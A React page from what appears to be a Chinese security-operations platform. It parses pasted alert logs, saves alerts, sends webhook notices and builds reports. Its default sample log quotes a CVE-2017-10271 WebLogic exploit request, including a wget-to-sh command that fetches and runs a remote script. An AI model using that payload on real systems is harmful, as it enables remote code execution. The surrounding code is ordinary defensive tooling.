import { useMemo, useState } from 'react';
import { useMutation, useQuery, useQueryClient } from '@tanstack/react-query';
import { CopyOutlined, SendOutlined, EditOutlined, CheckOutlined, FileTextOutlined } from '@ant-design/icons';
import { Alert, Button, Card, Col, Collapse, Form, Input, Row, Select, Space, Tabs, Tag, Typography, message } from 'antd';
import { api } from '../api/client';
import type { Device, Project, Template, User } from '../api/types';
import HelpTip from '../components/HelpTip';
import ReportGenerateModal from '../components/ReportGenerateModal';

const sample = `智能安全运营管理平台
态势感知
分析中心 / 威胁分析 / 事件研判 / 详情
事件概述
事件名称：WebLogic WLS 组件远程命令执行漏洞（CVE-2017-10271）
攻击结果：企图
源198.51.100.22目203.0.113.104
攻击链阶段 :
攻击渗透
处置状态 :
已处理
规则 ID :24174
事件分类 :
威胁类
开始结束时间 :
2026-05-24 05:05:36~2026-05-24 05:05:36
优先级 :
低
威胁等级 :
一般
设备来源 :
态势感知 _10.10.10.22
置信度 :
中
设备动作 :
允许
时间戳:
2026-05-24 05:05:36
日志类型:
远程命令执行漏洞
日志名称:
入侵防护日志
日志消息内容:
WebLogic WLS 组件远程命令执行漏洞（CVE-2017-10271）
日志附带的结果:
企图
产品类型:
态势感知
产品版本:
Demo-2026
厂商:
DemoSec
设备地址:
10.10.10.22
源IP:
198.51.100.22
源端口:
52250
目的IP:
203.0.113.104
目的端口:
9002
载荷:
POST /wls-wsat/CoordinatorPortType HTTP/1.1|||||<string>/bin/sh</string><string>-c</string><string>(wget -qO- http://203.0.113.134/rondo.xcw.sh)|sh&amp;</string>|||||
响应码:
--
响应内容:
.
请求内容:
POST /wls-wsat/CoordinatorPortType HTTP/1.1. Host: 203.0.113.104:9002. User-Agent: Mozilla/5.0. Content-Type: text/xml. <java version="1.8" class="java.beans.XMLDecoder"><void class="java.lang.ProcessBuilder"><string>/bin/sh</string><string>-c</string></void></java> .`;

const readStoredNumber = (key: string) => {
  const value = localStorage.getItem(key);
  const parsed = value ? Number(value) : undefined;
  return parsed && Number.isFinite(parsed) ? parsed : undefined;
};

const criticalityColor: Record<string, string> = {
  low: 'default',
  medium: 'blue',
  high: 'orange',
  critical: 'red'
};

function AssetHitCard({ title, asset, location }: { title: string; asset?: Record<string, any>; location?: string }) {
  const criticalityLabel: Record<string, string> = {
    low: '低',
    medium: '中',
    high: '高',
    critical: '极高'
  };
  const fingerprints = asset?.fingerprints || {};

  return (
    <Card size="small" title={title}>
      <Space direction="vertical" size={6} className="full-width">
        {asset && Object.keys(asset).length ? (
          <>
            <Space wrap>
              <Typography.Text strong>{asset.name || asset.ip || asset.domain}</Typography.Text>
              <Tag color={criticalityColor[asset.criticality] || 'blue'}>{criticalityLabel[asset.criticality] || asset.criticality}</Tag>
            </Space>
            <Typography.Text type="secondary">{asset.ip || '-'} {asset.domain ? `/ ${asset.domain}` : ''}</Typography.Text>
          </>
        ) : (
          <Typography.Text type="secondary">未命中企业资产</Typography.Text>
        )}
        {location && (
          <Typography.Text type="secondary" style={{ fontSize: '12px' }}>
            📍 {location}
          </Typography.Text>
        )}
        {asset && asset.area && (
          <Typography.Text>区域：{asset.area || '-'} / 负责人：{asset.owner || '-'}</Typography.Text>
        )}
        {asset && asset.tags && (
          <Space wrap>{(asset.tags || []).map((tag: string) => <Tag key={tag}>{tag}</Tag>)}</Space>
        )}
        {!!Object.keys(fingerprints).length && (
          <Collapse
            size="small"
            ghost
            items={[{ key: 'fingerprints', label: '指纹详情', children: <pre>{JSON.stringify(fingerprints, null, 2)}</pre> }]}
          />
        )}
      </Space>
    </Card>
  );
}

export default function LogParser() {
  const [rawText, setRawText] = useState(() => {
    const saved = localStorage.getItem('eff_parser_raw_text');
    return saved !== null ? saved : sample;
  });
  const [parsed, setParsed] = useState<Record<string, any>>(() => {
    const saved = localStorage.getItem('eff_parser_parsed');
    return saved ? JSON.parse(saved) : {};
  });
  const [isEditing, setIsEditing] = useState(false);
  const [matchedRules, setMatchedRules] = useState<unknown[]>(() => {
    const saved = localStorage.getItem('eff_parser_matched_rules');
    return saved ? JSON.parse(saved) : [];
  });
  const [formattedChat, setFormattedChat] = useState(() => localStorage.getItem('eff_parser_formatted_chat') || '');
  const [formattedExcel, setFormattedExcel] = useState(() => localStorage.getItem('eff_parser_formatted_excel') || '');
  const [ipAlerts, setIpAlerts] = useState<Array<{ message: string; list: string }>>(() => {
    const saved = localStorage.getItem('eff_parser_ip_alerts');
    return saved ? JSON.parse(saved) : [];
  });
  const [assetContext, setAssetContext] = useState<{ src_asset?: Record<string, any>; dst_asset?: Record<string, any> }>(() => {
    const saved = localStorage.getItem('eff_parser_asset_context');
    return saved ? JSON.parse(saved) : {};
  });
  const [projectId, setProjectId] = useState<number | undefined>(() => readStoredNumber('eff_parser_project_id'));
  const [deviceId, setDeviceId] = useState<number | undefined>(() => readStoredNumber('eff_parser_device_id'));
  const [messageTemplateId, setMessageTemplateId] = useState<number | undefined>(() => readStoredNumber('eff_parser_message_template_id') || readStoredNumber('eff_parser_template_id'));
  const [excelTemplateId, setExcelTemplateId] = useState<number | undefined>(() => readStoredNumber('eff_parser_excel_template_id'));
  const [reportOpen, setReportOpen] = useState(false);
  const queryClient = useQueryClient();

  const { data: currentUser } = useQuery({
    queryKey: ['me'],
    queryFn: async () => (await api.get<User>('/api/auth/me')).data
  });
  const isAdmin = currentUser?.role === 'admin';
  const isViewer = currentUser?.role === 'viewer';

  const { data: projects = [] } = useQuery({ queryKey: ['projects'], queryFn: async () => (await api.get<Project[]>('/api/projects')).data });
  const { data: devices = [] } = useQuery({ queryKey: ['devices'], queryFn: async () => (await api.get<Device[]>('/api/devices')).data });
  const { data: templates = [] } = useQuery({ queryKey: ['templates'], queryFn: async () => (await api.get<Template[]>('/api/templates')).data });
  const { data: rules = [] } = useQuery({ queryKey: ['rules'], queryFn: async () => (await api.get<any[]>('/api/rules')).data });
  const { data: settings = [] } = useQuery({ queryKey: ['settings'], queryFn: async () => (await api.get<Array<{ key: string; value: any }>>('/api/settings')).data });
  
  const fieldLabelMap = useMemo(() => {
    const map: Record<string, string> = {};
    rules.forEach(r => {
      if (!map[r.field_key] || r.is_meta) {
        map[r.field_key] = r.field_label || r.name;
      }
    });
    const builtins: Record<string, string> = {
      alert_code: '告警ID',
      alert_hash: '告警Hash',
      created_by_name: '创建人',
      assignee_name: '负责人',
      status_label: '状态',
      current_time: '当前时间',
      current_date: '当前日期',
      device_name: '设备名称',
      project_name: '项目名称',
      raw_text: '原始日志',
      ai_result: 'AI 研判结果',
      ti_result: '威胁情报结果',
      src_asset_name: '源资产名称',
      src_asset_area: '源资产区域',
      src_asset_owner: '源资产负责人',
      src_asset_criticality: '源资产重要性',
      dst_asset_name: '目的资产名称',
      dst_asset_area: '目的资产区域',
      dst_asset_owner: '目的资产负责人',
      dst_asset_criticality: '目的资产重要性',
      src_ip_location: '源IP地理位置',
      dst_ip_location: '目的IP地理位置'
    };
    return { ...builtins, ...map };
  }, [rules]);

  const webhookCfg = settings.find((item) => item.key === 'webhook')?.value || {};
  const webhookReady = webhookCfg.enabled !== false && ['dingtalk', 'wecom', 'feishu'].some((key) => webhookCfg?.[key]?.enabled && webhookCfg?.[key]?.url);
  const compatibleTemplates = templates.filter((item) => !item.device_id || item.device_id === deviceId);
  const messageTemplates = compatibleTemplates.filter((item) => item.type === 'message');
  const excelTemplates = compatibleTemplates.filter((item) => item.type === 'excel');
  const selectedProject = projects.find((item) => item.id === projectId);
  const selectedDevice = devices.find((item) => item.id === deviceId);
  const selectedMessageTemplate = templates.find((item) => item.id === messageTemplateId);

  const parse = useMutation({
    mutationFn: async () => (await api.post('/api/logs/parse', {
      text: rawText,
      device_id: deviceId,
      message_template_id: messageTemplateId,
      excel_template_id: excelTemplateId
    })).data,
    onSuccess: (data) => {
      setParsed(data.parsed_fields || {});
      setMatchedRules(data.matched_rules || []);
      setFormattedChat(data.formatted_chat || '');
      setFormattedExcel(data.formatted_excel || '');
      setIpAlerts(data.ip_list_alerts || []);
      setAssetContext(data.asset_context || {});
      
      localStorage.setItem('eff_parser_parsed', JSON.stringify(data.parsed_fields || {}));
      localStorage.setItem('eff_parser_matched_rules', JSON.stringify(data.matched_rules || []));
      localStorage.setItem('eff_parser_formatted_chat', data.formatted_chat || '');
      localStorage.setItem('eff_parser_formatted_excel', data.formatted_excel || '');
      localStorage.setItem('eff_parser_ip_alerts', JSON.stringify(data.ip_list_alerts || []));
      localStorage.setItem('eff_parser_asset_context', JSON.stringify(data.asset_context || {}));

      setIsEditing(false);
      (data.ip_list_alerts || []).forEach((item: { message: string; list: string }) => {
        if (item.list === 'blacklist') {
          message.error(item.message);
        } else {
          message.warning(item.message);
        }
      });
    },
    onError: (error: any) => {
      message.error(error?.response?.data?.detail || '解析失败，请检查配置');
    }
  });

  const reformat = useMutation({
    mutationFn: async (newFields: Record<string, any>) => (await api.post('/api/logs/reformat', {
      parsed_fields: newFields,
      device_id: deviceId,
      message_template_id: messageTemplateId,
      excel_template_id: excelTemplateId
    })).data,
    onSuccess: (data) => {
      setFormattedChat(data.formatted_chat || '');
      setFormattedExcel(data.formatted_excel || '');
      localStorage.setItem('eff_parser_formatted_chat', data.formatted_chat || '');
      localStorage.setItem('eff_parser_formatted_excel', data.formatted_excel || '');
    }
  });

  const updateField = (key: string, value: string) => {
    const next = { ...parsed, [key]: value };
    setParsed(next);
    localStorage.setItem('eff_parser_parsed', JSON.stringify(next));
    
    // 同步更新语义化映射字典，确保即时预览生效
    const label = fieldLabelMap[key];
    if (label) {
      // 我们暂不维护前端的 semantic_data state，因为 reformat 会从后端返回最新的渲染结果
      // 但为了保证 UI 的一致性，这里可以直接触发后端重绘
    }
    reformat.mutate(next);
  };

  const save = useMutation({
    mutationFn: async () => (await api.post('/api/alerts', { 
      raw_text: rawText, 
      parsed_fields: parsed, 
      project_id: projectId, 
      device_id: deviceId,
      message_template_id: messageTemplateId,
      excel_template_id: excelTemplateId
    })).data,
    onSuccess: () => {
      queryClient.invalidateQueries({ queryKey: ['alerts'] });
      message.success('告警已保存到工作台');
    },
    onError: (error: any) => {
      const detail = error?.response?.data?.detail;
      if (error?.response?.status === 409) {
        const text = typeof detail === 'object'
          ? `${detail.message || '该解析结果已存在'}${detail.alert_id ? `，告警ID：${detail.alert_id}` : ''}${detail.alert_hash ? `，Hash：${detail.alert_hash.slice(0, 8)}...` : ''}`
          : '该解析结果已进入告警工作台，请勿重复添加';
        message.warning(text);
        return;
      }
      message.error(typeof detail === 'string' ? detail : '保存失败，请稍后重试');
    }
  });

  const webhook = useMutation({
    mutationFn: async () => (await api.post('/api/webhook/send', { text: formattedChat })).data,
    onSuccess: () => message.success('已发送到群聊'),
    onError: (error: any) => message.error(error?.response?.data?.detail || '发送失败，请检查 Webhook 配置')
  });

  const copyText = async (text: string, label: string) => {
    if (!text) {
      message.warning(`${label}为空`);
      return;
    }
    await navigator.clipboard.writeText(text);
    message.success(`${label}已复制`);
  };

  const rememberSelection = (key: string, value?: number) => {
    if (value) {
      localStorage.setItem(key, String(value));
    } else {
      localStorage.removeItem(key);
    }
  };
  const resetParser = () => {
    setRawText(sample);
    setParsed({});
    setMatchedRules([]);
    setFormattedChat('');
    setFormattedExcel('');
    setIpAlerts([]);
    setAssetContext({});
    localStorage.removeItem('eff_parser_raw_text');
    localStorage.removeItem('eff_parser_parsed');
    localStorage.removeItem('eff_parser_matched_rules');
    localStorage.removeItem('eff_parser_formatted_chat');
    localStorage.removeItem('eff_parser_formatted_excel');
    localStorage.removeItem('eff_parser_ip_alerts');
    localStorage.removeItem('eff_parser_asset_context');
    message.info('解析器已重置');
  };

  const reportContext = useMemo(() => {
    const ruleValues: Record<string, any> = {};
    (matchedRules as Array<{ name?: string; field_key?: string }>).forEach((rule) => {
      if (rule.name && rule.field_key && parsed[rule.field_key] !== undefined) {
        ruleValues[rule.name] = parsed[rule.field_key];
      }
    });
    return {
      ...parsed,
      ...ruleValues,
      原始日志: rawText,
      消息格式: formattedChat,
      Excel格式: formattedExcel,
      命中规则: matchedRules,
      源资产: assetContext.src_asset || {},
      目的资产: assetContext.dst_asset || {},
      源资产名称: assetContext.src_asset?.name || parsed.src_asset_name || '',
      源资产重要性: assetContext.src_asset?.criticality || parsed.src_asset_criticality || '',
      目的资产名称: assetContext.dst_asset?.name || parsed.dst_asset_name || '',
      目的资产重要性: assetContext.dst_asset?.criticality || parsed.dst_asset_criticality || '',
      设备名称: selectedDevice?.name || '',
      项目名称: selectedProject?.name || ''
    };
  }, [assetContext, formattedChat, formattedExcel, matchedRules, parsed, rawText, selectedDevice?.name, selectedProject?.name]);

  return (
    <div className="page">
      <div className="page-toolbar">
        <div>
          <Typography.Title level={4}>内容解析</Typography.Title>
          <Typography.Text type="secondary">粘贴原始告警日志，解析后保存为团队协作记录</Typography.Text>
        </div>
        <Space wrap>
          <Button onClick={resetParser}>重置</Button>
          <Select
            allowClear
            placeholder="选择项目"
            style={{ width: 180 }}
            value={projectId}
            onChange={(value) => {
              setProjectId(value);
              rememberSelection('eff_parser_project_id', value);
            }}
            options={projects.map((item) => ({ value: item.id, label: item.name }))}
          />
          <Select
            allowClear
            placeholder="选择设备"
            style={{ width: 180 }}
            value={deviceId}
            onChange={(value) => {
              setDeviceId(value);
              rememberSelection('eff_parser_device_id', value);
            }}
            options={devices.map((item) => ({ value: item.id, label: item.name }))}
          />
          <Select
            allowClear
            placeholder="消息模板"
            style={{ width: 200 }}
            value={messageTemplateId}
            onChange={(value) => {
              setMessageTemplateId(value);
              rememberSelection('eff_parser_message_template_id', value);
            }}
            options={messageTemplates.map((item) => ({ value: item.id, label: item.name }))}
          />
          <Select
            allowClear
            placeholder="Excel 模板"
            style={{ width: 200 }}
            value={excelTemplateId}
            onChange={(value) => {
              setExcelTemplateId(value);
              rememberSelection('eff_parser_excel_template_id', value);
            }}
            options={excelTemplates.map((item) => ({ value: item.id, label: item.name }))}
          />
          <Button type="primary" loading={parse.isPending} onClick={() => parse.mutate()}>解析日志</Button>
          <Button loading={save.isPending} onClick={() => save.mutate()} disabled={isViewer || !Object.keys(parsed).length}>保存到工作台</Button>
          <Button
            icon={<FileTextOutlined />}
            onClick={() => setReportOpen(true)}
            disabled={isViewer || !Object.keys(parsed).length || !formattedChat}
          >
            保存为报告
          </Button>
        </Space>
      </div>

      <Row gutter={16}>
        <Col span={10}>
          <Input.TextArea
            rows={28}
            value={rawText}
            onChange={(e) => {
              const val = e.target.value;
              setRawText(val);
              localStorage.setItem('eff_parser_raw_text', val);
            }}
            placeholder="在此粘贴原始日志..."
            style={{ fontFamily: 'monospace', fontSize: '12px' }}
          />
        </Col>
        <Col span={14}>
          <Tabs
            items={[
              {
                key: 'parsed',
                label: '解析结果',
                children: (
                  <Space direction="vertical" className="full-width">
                    {!!ipAlerts.length && (
                      <Space direction="vertical" className="full-width">
                        {ipAlerts.map((item, index) => (
                          <Alert key={`${item.message}-${index}`} type={item.list === 'blacklist' ? 'error' : 'warning'} showIcon message={item.message} />
                        ))}
                      </Space>
                    )}
                    <div className="asset-hit-grid">
                      <AssetHitCard title="源 IP 命中资产" asset={assetContext.src_asset} location={parsed.src_ip_location} />
                      <AssetHitCard title="目的 IP 命中资产" asset={assetContext.dst_asset} location={parsed.dst_ip_location} />
                    </div>
                    <div style={{ textAlign: 'right' }}>
                      <Button 
                        size="small" 
                        type={isEditing ? 'primary' : 'default'} 
                        icon={isEditing ? <CheckOutlined /> : <EditOutlined />}
                        onClick={() => setIsEditing(!isEditing)}
                        disabled={!Object.keys(parsed).length}
                      >
                        {isEditing ? '完成编辑' : '手动修正结果'}
                      </Button>
                    </div>
                    {isEditing ? (
                      <div className="parsed-edit-grid" style={{ maxHeight: '500px', overflowY: 'auto', border: '1px solid #f0f0f0', padding: '12px', borderRadius: '4px' }}>
                        {Object.entries(parsed).map(([key, value]) => (
                          <div key={key} style={{ marginBottom: 12 }}>
                            <Typography.Text type="secondary" style={{ fontSize: '12px', display: 'block', marginBottom: 4 }}>
                              {key} {fieldLabelMap[key] ? `(${fieldLabelMap[key]})` : ''}
                            </Typography.Text>
                            <Input.TextArea
                              autoSize={{ minRows: 1, maxRows: 4 }}
                              value={String(value)}
                              onChange={(e) => updateField(key, e.target.value)}
                            />
                          </div>
                        ))}
                      </div>
                    ) : (
                      <pre className="result-box">{JSON.stringify(parsed, null, 2)}</pre>
                    )}
                  </Space>
                )
              },
              {
                key: 'chat',
                label: '消息格式',
                children: (
                  <div className="formatted-preview">
                    <div className="toolbar">
                      <Space>
                        <Button size="small" icon={<CopyOutlined />} onClick={() => copyText(formattedChat, '消息内容')}>复制</Button>
                        <Button size="small" type="primary" icon={<SendOutlined />} onClick={() => webhook.mutate()} disabled={isViewer || !webhookReady || webhook.isPending}>发送通报</Button>
                      </Space>
                    </div>
                    <pre className="result-box">{formattedChat}</pre>
                  </div>
                )
              },
              {
                key: 'excel',
                label: 'Excel 格式',
                children: (
                  <div className="formatted-preview">
                    <div className="toolbar">
                      <Button size="small" icon={<CopyOutlined />} onClick={() => copyText(formattedExcel, 'Excel 行')}>复制一行</Button>
                    </div>
                    <pre className="result-box">{formattedExcel}</pre>
                  </div>
                )
              },
              {
                key: 'rules',
                label: '命中规则',
                children: <pre className="result-box small">{JSON.stringify(matchedRules, null, 2)}</pre>
              }
            ]}
          />
        </Col>
      </Row>
      <ReportGenerateModal
        open={reportOpen}
        onClose={() => setReportOpen(false)}
        sourceType="module"
        sourceModule="log_parser"
        projectId={projectId}
        deviceId={deviceId}
        templateId={messageTemplateId}
        defaultTitle={`${parsed.event_type || selectedMessageTemplate?.name || '内容解析'} - 报告`}
        defaultCategory="内容解析报告"
        defaultReportKey={selectedMessageTemplate?.name}
        defaultTags={['内容解析']}
        defaultContext={reportContext}
        defaultSourceRefs={{
          template_id: messageTemplateId,
          matched_rule_ids: (matchedRules as Array<{ id?: number }>).map((item) => item.id).filter(Boolean)
        }}
        defaultContent={formattedChat}
      />
    </div>
  );
}
